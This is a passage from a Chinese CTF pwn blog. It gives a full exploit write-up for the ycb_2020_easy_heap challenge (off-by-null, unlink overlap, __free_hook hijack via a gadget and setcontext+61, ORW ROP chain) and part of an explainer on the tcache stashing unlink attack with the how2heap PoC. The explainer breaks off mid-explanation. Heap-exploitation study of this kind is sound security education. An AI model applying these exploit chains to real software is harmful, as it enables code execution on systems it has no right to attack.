class="line">.text:0000000000058019                 mov     eax, 0Eh</span><br><span class="line">.text:000000000005801E                 syscall                 ; LINUX - sys_rt_sigprocmask</span><br><span class="line">.text:0000000000058020                 pop     rdx</span><br><span class="line">.text:0000000000058021                 cmp     rax, 0FFFFFFFFFFFFF001h</span><br><span class="line">.text:0000000000058027                 jnb     loc_5814F</span><br><span class="line">.text:000000000005802D                 mov     rcx, [rdx+0E0h]</span><br><span class="line">.text:0000000000058034                 fldenv  byte ptr [rcx]</span><br><span class="line">.text:0000000000058036                 ldmxcsr dword ptr [rdx+1C0h]</span><br><span class="line">.text:000000000005803D                 mov     rsp, [rdx+0A0h]</span><br><span class="line">.text:0000000000058044                 mov     rbx, [rdx+80h]</span><br><span class="line">.text:000000000005804B                 mov     rbp, [rdx+78h]</span><br><span class="line">.text:000000000005804F                 mov     r12, [rdx+48h]</span><br><span class="line">.text:0000000000058053                 mov     r13, [rdx+50h]</span><br><span class="line">.text:0000000000058057                 mov     r14, [rdx+58h]</span><br><span class="line">.text:000000000005805B                 mov     r15, [rdx+60h]</span><br><span class="line">.text:000000000005805F                 test    dword ptr fs:48h, 2</span><br><span class="line">.text:000000000005806B                 jz      loc_58126</span><br><span class="line">......</span><br><span class="line">.text:0000000000058126 loc_58126:                              ; CODE XREF: setcontext+6B↑j</span><br><span class="line">.text:0000000000058126                 mov     rcx, [rdx+0A8h]</span><br><span class="line">.text:000000000005812D                 push    rcx</span><br><span class="line">.text:000000000005812E                 mov     rsi, [rdx+70h]</span><br><span class="line">.text:0000000000058132                 mov     rdi, [rdx+68h]</span><br><span class="line">.text:0000000000058136                 mov     rcx, [rdx+98h]</span><br><span class="line">.text:000000000005813D                 mov     r8, [rdx+28h]</span><br><span class="line">.text:0000000000058141                 mov     r9, [rdx+30h]</span><br><span class="line">.text:0000000000058145                 mov     rdx, [rdx+88h]</span><br><span class="line">.text:0000000000058145 ; &#125; // starts at 58000</span><br><span class="line">.text:000000000005814C ; __unwind &#123;</span><br><span class="line">.text:000000000005814C                 xor     eax, eax</span><br><span class="line">.text:000000000005814E                 retn</span><br></pre></td></tr></table></figure>

<p>重点在setcontext+61开始：<code>mov     rsp, [rdx+0A0h]</code>，以及后续的<code>mov     rcx, [rdx+0A8h]; push    rcx;  ...... ;retn;</code></p>
<p>这个过程中我们可以通过rdx来控制rsp跟最后的返回地址。</p>
<p>对于glibc-2.27及之前的版本，setcontext用rdi作为索引，控制起来要更简单，因为<code>__free_hook</code>的第一个参数是可控的，只需要设置好rdi的值就能在跳到setcontext之后修改目标寄存器的值，然后顺利执行提前布置好的orw chain</p>
<p>对于glibc-2.29及之后的版本，我们还需要用一段ROP去控制rdx的值才行</p>
<p>在glibc-2.29-2.32中有一段gadget就很适用，其位于<code>getkeyserv_handle+567</code>，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov    rdx, qword ptr [rdi + 8]</span><br><span class="line">mov    qword ptr [rsp], rax</span><br><span class="line">call   qword ptr [rdx + 0x20]</span><br></pre></td></tr></table></figure>

<p>通过这段gadget我们就可以通过rdi来控制rdx，并且在call指令中跳到setcontext完成后续步骤。</p>
<h3 id="ycb-2020-easy-heap"><a href="#ycb-2020-easy-heap" class="headerlink" title="ycb_2020_easy_heap"></a>ycb_2020_easy_heap</h3><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>（libc-2.30）</p>
<p>菜单如下，分别对应add、edit、free、show</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;----Welcome --------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1.Take a card&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2.Edit&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3.Drop a card&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;4.Take a view&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;5.Exit&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Choice:&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在edit功能函数里有个off-by-null</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BYTE *v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  v2 = sub_143F();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt; <span class="number">0xFF</span> || !qword_4460[v2] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Don not exist!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">  v0 = qword_4460[v2];</span><br><span class="line">  v0[read(<span class="number">0</span>, v0, qword_4060[v2])] = <span class="number">0</span>;          <span class="comment">// off-by-null</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;[+]Done!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>add功能函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0xFF</span> &amp;&amp; qword_4460[i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">  qword_4060[i] = sub_143F();</span><br><span class="line">  qword_4460[i] = <span class="built_in">malloc</span>(qword_4060[i]);</span><br><span class="line">  <span class="keyword">if</span> ( !qword_4460[i] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[!]Something Wrong!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;[+]Done!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>别的都很常规就不贴了</p>
<h4 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h4><p>保护全开，以及开了沙箱，要用orw来做</p>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>引用别的博客的总结</p>
<blockquote>
<p>高版本的<code>off by null</code>不能像之前那样随便地后向合并了，因为对<code>size</code>域的检查更加严格。因此，在高版本的<code>off by null</code>，利用姿势小结如下：</p>
<ul>
<li>如果有地址泄露，最起码可以泄露出<code>libc</code>地址，可以利用<code>last_remainder</code>这个指针；如果能泄露出堆地址，直接构造<code>unlink</code>即可</li>
<li>如果没有地址泄露，可以利用残留地址，进行利用，主要是<code>largebin</code>的<code>fd_nextsize</code>和<code>bk_nextsize</code>，<code>samllbin</code>的残留<code>bk</code>和<code>fastbin</code>的残留<code>fd</code>。围绕这几个构造堆重叠。</li>
</ul>
</blockquote>
<p>他说高版本多了些size域的检查，但是因为我也没总结过哪些保护在哪些版本是有的，哪些版本新出了啥啥保护之类的，所以不是特别清楚</p>
<p>第一点里的利用<code>last remainder</code>指针也没懂是啥意思，后面有题目用到了再回来补吧。</p>
<p>利用残留指针就是指虽然程序中不存在uaf漏洞，但是在有show的情况下可以通过把一些类型的chunk free掉，然后再拿回来，通过其入bin时留下的指针来进行地址的泄漏，这个还是很好懂的。</p>
<p>将这道题分别两部分来讲：首先是构造堆重叠来控制tcache的fd指针，劫持<code>__free_hook</code>。然后就是利用setcontext来完成orw的过程。</p>
<h4 id="构造堆重叠"><a href="#构造堆重叠" class="headerlink" title="构造堆重叠"></a>构造堆重叠</h4><p>这一部分其实比较常规，只要利用unlink来完成堆重叠即可，过程如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x410</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x4f0</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x410</span>)<span class="comment">#3</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - (<span class="number">0x7f7db95ecbe0</span> - <span class="number">0x00007f7db9402000</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc_base = &quot;</span>,<span class="built_in">hex</span>(libc_base)</span><br><span class="line">setcontext = libc_base + (<span class="number">0x7f4e6f508000</span> - <span class="number">0x00007f4e6f4b0000</span>)</span><br><span class="line">free_hook = libc_base + (<span class="number">0x7f4e6f69db20</span> - <span class="number">0x00007f4e6f4b0000</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x28</span>)<span class="comment">#1</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x6c0</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;heap_base = &quot;</span>,<span class="built_in">hex</span>(heap_base)</span><br><span class="line"></span><br><span class="line"><span class="comment">#unlink</span></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x470</span>) + p64(heap_base+<span class="number">0x6f0</span> - <span class="number">0x18</span>) + p64(heap_base+<span class="number">0x6f0</span> - <span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">0x28</span>)<span class="comment">#2</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span> + p64(<span class="number">0x470</span>))</span><br><span class="line">edit(<span class="number">1</span>,p64(heap_base+<span class="number">0x2a0</span>))</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#hijack</span></span><br><span class="line">add(<span class="number">0x460</span>)<span class="comment">#3</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x400</span> + p64(<span class="number">0x420</span>) + p64(<span class="number">0x31</span>) + p64(free_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#2</span></span><br></pre></td></tr></table></figure>

<p>这一部分值得注意的是fake_chunk中fd跟bk指针的构造，因为我们无法泄漏程序基址的缘故，我们无法知道在.bss中保存的<code>&amp;P</code>的地址，但是可以换个思路，我们只需要在某个chunk里写入<code>P</code>的地址，而堆地址是可以泄露的，这样我们同样可以绕过unlink的检测，对于上面的exp来讲就是倒数第29行那步</p>
<p>当然<code>P</code>的地址也不一定要我们手动写入，有时也可以利用堆中残留的指针来实现。</p>
<h4 id="gadget-setcontext-orw"><a href="#gadget-setcontext-orw" class="headerlink" title="gadget + setcontext + orw"></a>gadget + setcontext + orw</h4><p>因为是glibc-2.30的版本，所以我们用到了前面讲的<code>getkeyserv_handle+567</code>里的gadget</p>
<p>我们将<code>__free_hook</code>修改成这个gadget的地址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#mov    rdx,QWORD PTR [rdi+0x8]</span></span><br><span class="line"><span class="comment">#mov    QWORD PTR [rsp],rax</span></span><br><span class="line"><span class="comment">#call   QWORD PTR [rdx+0x20]</span></span><br><span class="line">gadget = libc_base + (<span class="number">0x7fc0540d8b20</span> - <span class="number">0x00007fc053f84000</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,p64(gadget))</span><br></pre></td></tr></table></figure>

<p>然后随便找些地方写入orw chain以及flag字符串</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pop_rdi = libc_base + libc.search(asm(<span class="string">&quot;pop rdi\nret&quot;</span>)).<span class="built_in">next</span>()</span><br><span class="line">pop_rsi = libc_base + libc.search(asm(<span class="string">&quot;pop rsi\nret&quot;</span>)).<span class="built_in">next</span>()</span><br><span class="line">pop_rdx_r12 = libc_base + <span class="number">0x11c3b1</span></span><br><span class="line">read = libc_base + libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write = libc_base + libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">ope = libc_base + libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">ret = libc_base + <span class="number">0x256b9</span></span><br><span class="line"></span><br><span class="line">flag_addr = heap_base + <span class="number">0x720</span></span><br><span class="line">orw_addr = heap_base + <span class="number">0x740</span></span><br><span class="line"></span><br><span class="line">orw = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="number">0</span>) + p64(ope)</span><br><span class="line">orw += p64(pop_rdi) + p64(<span class="number">3</span>) + p64(pop_rsi) + p64(heap_base) + p64(pop_rdx_r12) + p64(<span class="number">0x20</span>) + p64(<span class="number">0</span>) + p64(read)</span><br><span class="line">orw += p64(pop_rdi) + p64(<span class="number">1</span>) + p64(pop_rsi) + p64(heap_base) + p64(pop_rdx_r12) + p64(<span class="number">0x20</span>) + p64(<span class="number">0</span>) + p64(write)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x150</span>)<span class="comment">#6</span></span><br><span class="line">add(<span class="number">0x150</span>)<span class="comment">#7</span></span><br><span class="line">edit(<span class="number">5</span>,<span class="string">&#x27;./flag\x00\x00&#x27;</span>)</span><br><span class="line">edit(<span class="number">6</span>,orw)</span><br></pre></td></tr></table></figure>

<p>在做题的时候还发现有些用libc.search找出来的gadget在没有执行权限的libc段里，导致crash了，也不知道是啥情况，所以可能还是用ropper之类的找好一点。</p>
<p>然后就是最后一步，控制好rdi的值，在相应地址布置好对应的值即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(heap_base+<span class="number">0x8b0</span>)<span class="comment">#rdi</span></span><br><span class="line">payload += p64(heap_base+<span class="number">0x8a0</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x20</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(setcontext+<span class="number">61</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(orw_addr)<span class="comment">#rsp</span></span><br><span class="line">payload += p64(ret)<span class="comment">#rcx</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">7</span>,payload)</span><br><span class="line">free(<span class="number">7</span>)</span><br></pre></td></tr></table></figure>

<p>稍微解释一下上面这部分，free掉chunk7之后<code>p64(heap_base+0x8b0)</code>会被传给rdi，<code>[rdi - 8]</code>也就是<code>*(heap_base+0x8b0 - 8)</code>对应的就是payload中的第二个p64，这个值会传给rdx。然后就是根据gadget剩下的部分以及setcontext的部分来布置地址即可。</p>
<h4 id="别的思路"><a href="#别的思路" class="headerlink" title="别的思路"></a>别的思路</h4><p>对于本题而言还有一些别的挺不错的解法，但是暂时还没试过，先挂在这<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/236832#h3-9">PWN堆溢出技巧：ORW的解题手法与万金油Gadgets - 安全客，安全资讯平台 (anquanke.com)</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/05/16/tcache/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPt的Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/16/tcache/" class="post-title-link" itemprop="url">tcache</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-05-16 15:57:49" itemprop="dateCreated datePublished" datetime="2022-05-16T15:57:49+08:00">2022-05-16</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-06-21 15:53:46" itemprop="dateModified" datetime="2022-06-21T15:53:46+08:00">2022-06-21</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache stashing unlink attack"></a>tcache stashing unlink attack</h3><blockquote>
<p>这种攻击利用的是 tcache bin 有剩余 (数量小于 <code>TCACHE_MAX_BINS</code> ) 时，同大小的 small bin 会放进 tcache 中 (这种情况可以用 <code>calloc</code> 分配同大小堆块触发，因为 <code>calloc</code> 分配堆块时不从 tcache bin 中选取)。在获取到一个 <code>smallbin</code> 中的一个 chunk 后会如果 tcache 仍有足够空闲位置，会将剩余的 small bin 链入 tcache ，在这个过程中只对第一个 bin 进行了完整性检查，后面的堆块的检查缺失。当攻击者可以写一个 small bin 的 bk 指针时，其可以在任意地址上写一个 libc 地址 (类似 <code>unsorted bin attack</code> 的效果)。构造得当的情况下也可以分配 fake chunk 到任意地址。</p>
</blockquote>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ol>
<li><p>从glibc-2.29开始就无法使用unsorted bin attack</p>
</li>
<li><p>tcache stashing unlink attack能实现两种利用：一是将任意地址放到tcache中，实现任意地址申请。二是向任意地址写入一个libc值</p>
</li>
<li><p>当<code>small bin：chunk1 -&gt; chunk2</code>这样时，<strong>修改chunk1的bk为要写入的目标地址-0x10，同时让对应大小的tcache bin中有6个chunk，</strong>然后从这条small bin中取出chunk2时，就完成了写入的目的</p>
<p>如果要实现将任意地址放入tcache的话，还需要保证一点就是：<strong>目标地址-0x18中有一个可写的有效地址</strong>，因为将chunk中small bin中取出的时候，需要完成<code>bck-&gt;fd = bin</code>的操作，所以需要<code>victim-&gt;bk</code>是一个可写的有效地址，否则在这一步中会因为地址非法而crash。<strong>保证这一点之后让对应大小的tcache bin中有5个chunk即可</strong></p>
</li>
</ol>
<h4 id="how2heap中的poc"><a href="#how2heap中的poc" class="headerlink" title="how2heap中的poc"></a>how2heap中的poc</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *chunk_lis[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *target;</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;stack_var addr is:%p\n&quot;</span>,&amp;stack_var[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk_lis addr is:%p\n&quot;</span>,&amp;chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;target addr is:%p\n&quot;</span>,(<span class="keyword">void</span>*)target);</span><br><span class="line"></span><br><span class="line">    stack_var[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        chunk_lis[i] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xa0</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    </span><br><span class="line">    chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)stack_var;</span><br><span class="line">    <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x90</span>);</span><br><span class="line"> </span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;target now: %p\n&quot;</span>,(<span class="keyword">void</span>*)target);</span><br><span class="line">    </span><br><span class="line">    assert(target == &amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>具体原理其实引言里说的很清楚，只是第一次看可能没那么清楚，跟着poc走一次就知道是什么意思了</p>
<p>到第29行为止，bin结构如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ bins</span><br><span class="line">tcachebins</span><br><span class="line">0xa0 [  7]: 0x602300 —▸ 0x602760 —▸ 0x6026c0 —▸ 0x602620 —▸ 0x602580 ◂— ...</span><br><span class="line"></span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x602390 —▸ 0x602250 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x602390</span><br></pre></td></tr></table></figure>

<p>接下来<code>malloc(0xa0);</code>的目的是触发malloc_consolidate()，将unsorted bin中的chunk放到small bin中，后续再从tcache中取出两个chunk</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ bins</span><br><span class="line">tcachebins</span><br><span class="line">0xa0 [  5]: 0x6026c0 —▸ 0x602620 —▸ 0x602580 —▸ 0x6024e0 —▸ 0x602440 ◂— ...</span><br><span class="line"></span><br><span class="line">smallbins</span><br><span class="line">0xa0: 0x602390 —▸ 0x602250 —▸ 0x7ffff7dcfd30 (main_arena+240) ◂— 0x602390</span><br></pre></td></tr></table></figure>

<p>然后<code>chunk_lis[2][1] = (unsigned long)stack_var;</code>，也就是<code>*(*(chunk_lis[2]) + 8) = (unsigned long)stack_var</code>，修改了<code>chunk_lis[2]</code>所对应chunk的bk指针，对应到上图也就是<code>0x602390</code>的bk指针，此时small bin链表变成如下</p>
